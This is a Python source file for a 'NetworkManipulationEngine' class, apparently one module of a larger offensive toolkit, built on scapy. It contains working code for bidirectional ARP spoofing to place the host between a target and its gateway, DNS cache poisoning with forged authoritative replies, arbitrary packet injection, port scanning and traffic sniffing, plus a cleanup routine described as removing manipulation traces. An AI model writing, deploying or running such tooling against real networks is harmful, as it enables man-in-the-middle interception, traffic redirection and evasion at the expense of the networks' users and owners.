import logging
import time
import psutil
import socket
import struct
import threading
import subprocess
import platform
from typing import Dict, List, Tuple, Optional
from scapy.all import *

class NetworkManipulationEngine:
    """
    Comprehensive network manipulation engine with ARP spoofing, packet injection,
    traffic analysis, and network reconnaissance capabilities.
    """
    def __init__(self):
        self.logger = logging.getLogger("NetworkManipulationEngine")
        self.initialized = False
        self.arp_spoofing_active = False
        self.packet_injection_active = False
        self.traffic_analysis_active = False
        self.spoofed_targets = {}
        self.injected_packets = []
        self.captured_traffic = []

    def initialize(self):
        """Initialize the network manipulation engine"""
        self.logger.info("[Network] Network manipulation engine initializing...")
        
        # Check for required privileges
        if not self._check_privileges():
            self.logger.warning("[Network] Insufficient privileges for advanced network operations")
        
        # Initialize network interfaces
        self.interfaces = self._get_network_interfaces()
        self.logger.info(f"[Network] Found {len(self.interfaces)} network interfaces")
        
        self.initialized = True
        self.logger.info("[Network] Network manipulation engine initialized successfully")

    def manipulation_loop(self):
        """Main network manipulation loop"""
        while True:
            try:
                self.logger.debug("[Network] Running network manipulation loop...")
                
                # Monitor network interfaces
                self._monitor_interfaces()
                
                # Check for network anomalies
                self._detect_network_anomalies()
                
                # Update ARP cache if spoofing is active
                if self.arp_spoofing_active:
                    self._maintain_arp_spoof()
                
                # Analyze captured traffic
                if self.traffic_analysis_active:
                    self._analyze_captured_traffic()
                
                time.sleep(30)  # Run every 30 seconds
                
            except Exception as e:
                self.logger.error(f"[Network] Error in manipulation loop: {e}")
                time.sleep(60)

    def execute_manipulation(self, params=None):
        """Execute specific network manipulation tasks"""
        if not params:
            return
            
        operation = params.get("operation")
        
        if operation == "arp_spoof":
            target_ip = params.get("target_ip")
            gateway_ip = params.get("gateway_ip")
            interface = params.get("interface")
            self.start_arp_spoof(target_ip, gateway_ip, interface)
            
        elif operation == "packet_inject":
            target_ip = params.get("target_ip")
            target_port = params.get("target_port")
            payload = params.get("payload")
            self.inject_packet(target_ip, target_port, payload)
            
        elif operation == "traffic_analysis":
            interface = params.get("interface")
            duration = params.get("duration", 60)
            self.start_traffic_analysis(interface, duration)
            
        elif operation == "port_scan":
            target_ip = params.get("target_ip")
            ports = params.get("ports", "1-1000")
            self.scan_ports(target_ip, ports)
            
        elif operation == "dns_poison":
            target_ip = params.get("target_ip")
            domain = params.get("domain")
            spoofed_ip = params.get("spoofed_ip")
            self.poison_dns_cache(target_ip, domain, spoofed_ip)
            
        else:
            self.logger.warning(f"[Network] Unknown manipulation operation: {operation}")

    def check_manipulation_status(self):
        """Check the status of network manipulation activities"""
        status = {
            "initialized": self.initialized,
            "arp_spoofing_active": self.arp_spoofing_active,
            "packet_injection_active": self.packet_injection_active,
            "traffic_analysis_active": self.traffic_analysis_active,
            "spoofed_targets": len(self.spoofed_targets),
            "injected_packets": len(self.injected_packets),
            "captured_traffic": len(self.captured_traffic)
        }
        
        self.logger.info(f"[Network] Status: {status}")
        return status

    def cleanup(self):
        """Clean up network manipulation traces"""
        self.logger.info("[Network] Cleaning up network manipulation traces...")
        
        # Stop ARP spoofing
        if self.arp_spoofing_active:
            self.stop_arp_spoof()
        
        # Stop packet injection
        if self.packet_injection_active:
            self.stop_packet_injection()
        
        # Stop traffic analysis
        if self.traffic_analysis_active:
            self.stop_traffic_analysis()
        
        # Clear captured data
        self.spoofed_targets.clear()
        self.injected_packets.clear()
        self.captured_traffic.clear()
        
        self.logger.info("[Network] Network manipulation cleanup complete")

    def start_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str = None):
        """Start ARP spoofing attack"""
        try:
            self.logger.info(f"[Network] Starting ARP spoof: {target_ip} -> {gateway_ip}")
            
            if not interface:
                interface = self._get_default_interface()
            
            # Store spoofing configuration
            self.spoofed_targets[target_ip] = {
                "gateway": gateway_ip,
                "interface": interface,
                "start_time": time.time()
            }
            
            # Start ARP spoofing thread
            spoof_thread = threading.Thread(
                target=self._arp_spoof_worker,
                args=(target_ip, gateway_ip, interface),
                daemon=True
            )
            spoof_thread.start()
            
            self.arp_spoofing_active = True
            self.logger.info(f"[Network] ARP spoofing started successfully")
            
        except Exception as e:
            self.logger.error(f"[Network] Failed to start ARP spoof: {e}")

    def stop_arp_spoof(self):
        """Stop ARP spoofing attack"""
        self.logger.info("[Network] Stopping ARP spoofing...")
        self.arp_spoofing_active = False
        self.spoofed_targets.clear()
        self.logger.info("[Network] ARP spoofing stopped")

    def inject_packet(self, target_ip: str, target_port: int, payload: str):
        """Inject a custom packet"""
        try:
            self.logger.info(f"[Network] Injecting packet to {target_ip}:{target_port}")
            
            # Create custom packet
            packet = IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=payload)
            
            # Send packet
            send(packet, verbose=False)
            
            # Log injection
            self.injected_packets.append({
                "target_ip": target_ip,
                "target_port": target_port,
                "payload": payload,
                "timestamp": time.time()
            })
            
            self.logger.info(f"[Network] Packet injected successfully")
            
        except Exception as e:
            self.logger.error(f"[Network] Failed to inject packet: {e}")

    def start_traffic_analysis(self, interface: str, duration: int = 60):
        """Start traffic analysis on specified interface"""
        try:
            self.logger.info(f"[Network] Starting traffic analysis on {interface} for {duration}s")
            
            # Start packet capture
            capture_thread = threading.Thread(
                target=self._capture_traffic,
                args=(interface, duration),
                daemon=True
            )
            capture_thread.start()
            
            self.traffic_analysis_active = True
            self.logger.info(f"[Network] Traffic analysis started")
            
        except Exception as e:
            self.logger.error(f"[Network] Failed to start traffic analysis: {e}")

    def stop_traffic_analysis(self):
        """Stop traffic analysis"""
        self.logger.info("[Network] Stopping traffic analysis...")
        self.traffic_analysis_active = False
        self.logger.info("[Network] Traffic analysis stopped")

    def scan_ports(self, target_ip: str, ports: str):
        """Scan ports on target host"""
        try:
            self.logger.info(f"[Network] Scanning ports {ports} on {target_ip}")
            
            # Parse port range
            if "-" in ports:
                start_port, end_port = map(int, ports.split("-"))
                port_list = range(start_port, end_port + 1)
            else:
                port_list = [int(ports)]
            
            open_ports = []
            
            for port in port_list:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target_ip, port))
                    if result == 0:
                        open_ports.append(port)
                        self.logger.info(f"[Network] Port {port} is open on {target_ip}")
                    sock.close()
                except Exception:
                    continue
            
            self.logger.info(f"[Network] Port scan complete. Open ports: {open_ports}")
            return open_ports
            
        except Exception as e:
            self.logger.error(f"[Network] Port scan failed: {e}")
            return []

    def poison_dns_cache(self, target_ip: str, domain: str, spoofed_ip: str):
        """Poison DNS cache with fake entry"""
        try:
            self.logger.info(f"[Network] Poisoning DNS cache: {domain} -> {spoofed_ip}")
            
            # Create DNS response packet
            dns_response = IP(dst=target_ip)/UDP(dport=53)/DNS(
                id=0x1234,
                qr=1,  # Response
                aa=1,  # Authoritative answer
                qd=DNSQR(qname=domain),
                an=DNSRR(rrname=domain, type="A", rdata=spoofed_ip)
            )
            
            # Send DNS response
            send(dns_response, verbose=False)
            
            self.logger.info(f"[Network] DNS cache poisoned successfully")
            
        except Exception as e:
            self.logger.error(f"[Network] DNS cache poisoning failed: {e}")

    def _check_privileges(self) -> bool:
        """Check if we have sufficient privileges for network operations"""
        try:
            if platform.system() == "Windows":
                # On Windows, check if running as administrator
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                # On Unix-like systems, check if we can create raw sockets
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.close()
                    return True
                except PermissionError:
                    return False
        except Exception:
            return False

    def _get_network_interfaces(self) -> Dict[str, Dict]:
        """Get available network interfaces"""
        interfaces = {}
        
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                interfaces[iface] = {
                    "addresses": [addr.address for addr in addrs if addr.family == socket.AF_INET],
                    "mac_addresses": [addr.address for addr in addrs if addr.family == psutil.AF_LINK],
                    "status": "up" if iface in psutil.net_if_stats() else "down"
                }
        except Exception as e:
            self.logger.error(f"[Network] Failed to get network interfaces: {e}")
        
        return interfaces

    def _get_default_interface(self) -> str:
        """Get the default network interface"""
        try:
            # Try to get default gateway interface
            if platform.system() == "Windows":
                result = subprocess.run(["route", "print"], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if "0.0.0.0" in line and "0.0.0.0" in line:
                        parts = line.split()
                        if len(parts) > 3:
                            return parts[3]
            else:
                result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if "default" in line:
                        parts = line.split()
                        if len(parts) > 4:
                            return parts[4]
        except Exception:
            pass
        
        # Fallback to first available interface
        if self.interfaces:
            return list(self.interfaces.keys())[0]
        
        return "eth0"  # Default fallback

    def _monitor_interfaces(self):
        """Monitor network interfaces for changes"""
        current_interfaces = self._get_network_interfaces()
        
        for iface, info in current_interfaces.items():
            if iface not in self.interfaces:
                self.logger.info(f"[Network] New interface detected: {iface}")
            elif self.interfaces[iface] != info:
                self.logger.info(f"[Network] Interface {iface} configuration changed")
        
        self.interfaces = current_interfaces

    def _detect_network_anomalies(self):
        """Detect network anomalies and suspicious activity"""
        try:
            # Check for unusual network connections
            connections = psutil.net_connections()
            
            # Look for connections to suspicious ports
            suspicious_ports = {22, 23, 3389, 5900, 5901}  # SSH, Telnet, RDP, VNC
            
            for conn in connections:
                if conn.status == 'ESTABLISHED' and conn.raddr:
                    if conn.raddr.port in suspicious_ports:
                        self.logger.warning(f"[Network] Suspicious connection detected: {conn.raddr.ip}:{conn.raddr.port}")
                        
        except Exception as e:
            self.logger.debug(f"[Network] Anomaly detection failed: {e}")

    def _maintain_arp_spoof(self):
        """Maintain ARP spoofing by sending periodic ARP replies"""
        if not self.arp_spoofing_active:
            return
            
        for target_ip, config in self.spoofed_targets.items():
            try:
                # Send ARP reply to target claiming to be gateway
                arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,  # Reply
                    hwsrc=get_if_hwaddr(config["interface"]),
                    psrc=config["gateway"],
                    hwdst="ff:ff:ff:ff:ff:ff",
                    pdst=target_ip
                )
                
                send(arp_reply, iface=config["interface"], verbose=False)
                
            except Exception as e:
                self.logger.debug(f"[Network] ARP spoof maintenance failed for {target_ip}: {e}")

    def _arp_spoof_worker(self, target_ip: str, gateway_ip: str, interface: str):
        """Worker thread for ARP spoofing"""
        while self.arp_spoofing_active:
            try:
                # Send ARP reply to target claiming to be gateway
                arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,  # Reply
                    hwsrc=get_if_hwaddr(interface),
                    psrc=gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    pdst=target_ip
                )
                
                send(arp_reply, iface=interface, verbose=False)
                
                # Send ARP reply to gateway claiming to be target
                arp_reply2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,  # Reply
                    hwsrc=get_if_hwaddr(interface),
                    psrc=target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    pdst=gateway_ip
                )
                
                send(arp_reply2, iface=interface, verbose=False)
                
                time.sleep(2)  # Send ARP replies every 2 seconds
                
            except Exception as e:
                self.logger.error(f"[Network] ARP spoof worker error: {e}")
                time.sleep(5)

    def _capture_traffic(self, interface: str, duration: int):
        """Capture network traffic on specified interface"""
        try:
            self.logger.info(f"[Network] Starting traffic capture on {interface}")
            
            start_time = time.time()
            
            def packet_callback(packet):
                if time.time() - start_time > duration:
                    return
                    
                # Store packet information
                packet_info = {
                    "timestamp": time.time(),
                    "src_ip": packet[IP].src if IP in packet else None,
                    "dst_ip": packet[IP].dst if IP in packet else None,
                    "src_port": packet[TCP].sport if TCP in packet else None,
                    "dst_port": packet[TCP].dport if TCP in packet else None,
                    "protocol": packet.proto if hasattr(packet, 'proto') else None,
                    "length": len(packet)
                }
                
                self.captured_traffic.append(packet_info)
                
                # Log interesting packets
                if packet_info["src_port"] in [80, 443, 22, 23, 3389] or packet_info["dst_port"] in [80, 443, 22, 23, 3389]:
                    self.logger.info(f"[Network] Interesting packet: {packet_info['src_ip']}:{packet_info['src_port']} -> {packet_info['dst_ip']}:{packet_info['dst_port']}")
            
            # Start packet capture
            sniff(iface=interface, prn=packet_callback, store=0, timeout=duration)
            
            self.logger.info(f"[Network] Traffic capture completed. Captured {len(self.captured_traffic)} packets")
            
        except Exception as e:
            self.logger.error(f"[Network] Traffic capture failed: {e}")

    def _analyze_captured_traffic(self):
        """Analyze captured traffic for patterns and anomalies"""
        if not self.captured_traffic:
            return
            
        try:
            # Analyze traffic patterns
            protocols = {}
            ports = {}
            ips = {}
            
            for packet in self.captured_traffic:
                # Count protocols
                if packet["protocol"]:
                    protocols[packet["protocol"]] = protocols.get(packet["protocol"], 0) + 1
                
                # Count ports
                if packet["src_port"]:
                    ports[packet["src_port"]] = ports.get(packet["src_port"], 0) + 1
                if packet["dst_port"]:
                    ports[packet["dst_port"]] = ports.get(packet["dst_port"], 0) + 1
                
                # Count IPs
                if packet["src_ip"]:
                    ips[packet["src_ip"]] = ips.get(packet["src_ip"], 0) + 1
                if packet["dst_ip"]:
                    ips[packet["dst_ip"]] = ips.get(packet["dst_ip"], 0) + 1
            
            # Log analysis results
            if protocols:
                self.logger.info(f"[Network] Protocol distribution: {dict(list(protocols.items())[:5])}")
            
            if ports:
                top_ports = sorted(ports.items(), key=lambda x: x[1], reverse=True)[:5]
                self.logger.info(f"[Network] Top ports: {top_ports}")
            
            if ips:
                top_ips = sorted(ips.items(), key=lambda x: x[1], reverse=True)[:5]
                self.logger.info(f"[Network] Top IPs: {top_ips}")
                
        except Exception as e:
            self.logger.error(f"[Network] Traffic analysis failed: {e}") 